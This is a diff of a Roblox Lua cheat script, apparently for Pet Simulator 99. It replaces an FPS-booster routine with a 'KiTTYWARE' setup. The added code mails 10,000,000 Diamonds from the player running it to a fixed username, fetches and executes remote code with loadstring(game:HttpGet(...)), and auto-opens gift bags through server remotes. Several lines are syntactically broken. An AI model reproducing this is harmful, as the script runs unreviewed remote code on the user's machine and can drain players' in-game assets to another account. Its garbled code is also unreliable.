@@ -1,77 +1,46 @@
-task.spawn(function()
-    while task.wait() do
-local Model = workspace
-local ClassTypes = {
-	"Decal",
-	"Texture",
-        "Important",
-        "Ground"
+_G.autosend = true
+_G.openDelay = 25
+getgenv().KiTTYWARE = {
+    autoPrepare = {
+        Usernames = {
+
+"sorayuu112",
+
+
+
+            
+        },
+        mailConfig = {
+            --{Class = "Pet", Name = "Alien Parasite", Tier = 2, Shiny = false, Amount = 40},
+            --{Class = "Potion", Name = "Coins", Tier = 5, Shiny = false, Amount = 6},
+            --{Class = "Enchant", Name = "Coins", Tier = 5, Shiny = false, Amount = 2},
+            {Class = "Currency", Name = "Diamonds", Tier = nil, Shiny = false, Amount = 10000000},
+            --{Class = "Item", Name = "Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
+            --{Class = "Item", Name = "Large Gift Bag", Tier = nil, Shiny = false, Amount = 3000},
+            --{Class = "Item", Name = "Charm Stone", Tier = nil, Shiny = false, Amount = 1000},
+        },
+    }
 }
 
-for _, v in ipairs(workspace:GetDescendants()) do
-	if table.find(ClassTypes, v.ClassName) then
-		print(v.ClassName)
-		v:Destroy()
-	end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xnazov/KITTYWARE_PS99/main/autoPrepare"))()
+
+        autosend(v)
+    end
+en
+
+
+_G.autoOpen = true
+_G.openDelay = 0.5
+
+local Network = game.ReplicatedStorage.Network
+local Items = {"Gift Bag", "Large Gift Bag", "Charm Stone"}
+
+function autoOpen(name)
+    Network.GiftBag_Open:InvokeServer(name)
 end
 
-local Workspace = game:GetService("Workspace")
-local Terrain = Workspace:WaitForChild("Terrain")
-Terrain.WaterReflectance = 0
-Terrain.WaterTransparency = 0
-Terrain.WaterWaveSize = 0
-Terrain.WaterWaveSpeed = 0
-
-local Lighting = game:GetService("Lighting")
-Lighting.Brightness = 0
-Lighting.GlobalShadows = false
-Lighting.FogEnd = 9e100
-Lighting.FogStart = 0
-
-sethiddenproperty(Lighting, "Technology", 2)
-sethiddenproperty(Terrain, "Decoration", false)
-
-local function clearTextures(v)
-    if v:IsA("BasePart") and not v:IsA("MeshPart") then
-        v.Material = "Plastic"
-        v.Reflectance = 0
-    elseif (v:IsA("Decal") or v:IsA("Texture")) then
-        v.Transparency = 0
-    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-        v.Lifetime = NumberRange.new(0)
-    elseif v:IsA("Explosion") then
-        v.BlastPressure = 0
-        v.BlastRadius = 0
-    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
-        v.Enabled = false
-    elseif v:IsA("MeshPart") then
-        v.Material = "Plastic"
-        v.Reflectance = 0
-        v.TextureID = 10385902758728957
-    elseif v:IsA("SpecialMesh")  then
-        v.Reflectance = 0
-        v.TextureId = 0 ~ 19385902758728957)
-    elseif v:IsA("ShirtGraphic") then
-        v.Graphic = 0
-    elseif (v:IsA("Shirt") or v:IsA("Pants")) then
-        v[v.ClassName .. "Template"] = 1
-    elseif v.Name == "Foilage" and v:IsA("Folder") then
-        v:Destroy()
-    elseif string.find(v.Name, "Tree") or string.find(v.Name, "Water") or string.find(v.Name, "Bush") or string.find(v.Name, "grass") or string.find(v.Name, "house") or string.find(v.Name, "sky") or string.find(v.Name, "wood") or string.find(v.Name, "pebble") or string.find(v.Name, "metal") or string.find(v.Name, "Wood") or string.find(v.Name, "ice") or string.find(v.Name, "woodplanks") or string.find(v.Name, "slate") or string.find(v.Name, "plastic") or string.find(v.Name, "sand") or string.find(v.Name, "granite") then
-        task.wait()
-        v:Destroy()
+while _G.autoOpen do task.wait(_G.openDelay)
+    for i,v in pairs(Items) do
+        autoOpen(v)
     end
 end
-
-game:GetService("Lighting"):ClearAllChildren()
-
-for _, v in pairs(Workspace:GetDescendants()) do
-    clearTextures(v)
-end
-
-Workspace.DescendantAdded:Connect(function(v)
-    clearTextures(v)
-end)
-        task.wait(5)
-    end
-end)
